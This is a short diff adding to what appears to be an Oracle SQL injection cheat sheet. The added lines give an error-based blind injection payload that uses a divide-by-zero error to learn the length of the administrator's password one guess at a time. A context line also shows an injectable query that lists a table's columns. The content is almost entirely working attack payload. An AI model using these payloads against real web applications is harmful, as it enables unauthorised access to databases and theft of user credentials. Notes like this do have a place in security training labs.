@@ -24,3 +24,8 @@ Get columns of specific table
 ```SQL
 select column_name from all_tab_columns where table_name = 'TABLE NAME HERE' --
 ```
+
+Finding password length
+```SQL
+'||(select case when length(password)>{INCREASE NUMBER STARTING FROM 1} then to_char(1/0) else '' end from users where username = 'administrator')||'
+```
